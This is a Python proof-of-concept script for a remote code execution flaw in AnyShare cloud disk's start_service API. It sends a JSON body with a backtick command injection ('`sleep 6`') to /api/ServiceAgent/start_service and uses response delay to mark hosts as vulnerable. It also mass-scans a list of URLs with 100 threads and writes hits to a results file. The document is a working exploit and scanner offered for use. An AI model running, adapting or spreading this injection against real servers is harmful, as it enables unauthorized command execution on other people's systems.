#body="/res/libs/webuploader/webuploader.css" 
import requests,argparse,sys,urllib3,warnings,colorama
from multiprocessing.dummy import Pool #多线程库
from colorama import Fore   #字体颜色

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    text = """
         _____                 _________.__                          
  /  _  \   ____ ___.__./   _____/|  |__ _____ _______   ____  
 /  /_\  \ /    <   |  |\_____  \ |  |  \\__  \\_  __ \_/ __ \ 
/    |    \   |  \___  |/        \|   Y  \/ __ \|  | \/\  ___/ 
\____|__  /___|  / ____/_______  /|___|  (____  /__|    \___  >
        \/     \/\/            \/      \/     \/            \/ 
                                                author:eagle
    """
    print(text)
def main():
    parse = argparse.ArgumentParser(description='爱数AnyShare爱数云盘start_service远程代码执行漏洞 POC')
    parse.add_argument('-u','--url',dest='url',type=str,help='Pleause input your url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Pleause input your file')
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)   
        mp.close
        mp.join
    else:
        print(f'Useage python {sys.argv[0]} -h')
def poc(target):
    link = '/api/ServiceAgent/start_service'
    hearders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate, br'
    }
    data = """
            [
            "`sleep 6`"
            ]
            """
    try:
        res1 = requests.get(url=target,headers=hearders,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 =requests.post(url=target+link,data=data,headers=hearders,verify=False)
            if res2.elapsed.total_seconds() >= 5:
                print(Fore.RED + f'[+]{target}存在远程代码执行漏洞' + Fore.RESET)
                with open('result.txt','a',encoding='utf-8') as a:
                    a.write(f'[+]{target}存在远程代码执行漏洞\n')
            else:
                print(f'[-]{target}不存在漏洞')
    except:
         print(f'[!]{target}存在异常请手动测试')
if __name__ == '__main__':
    main()
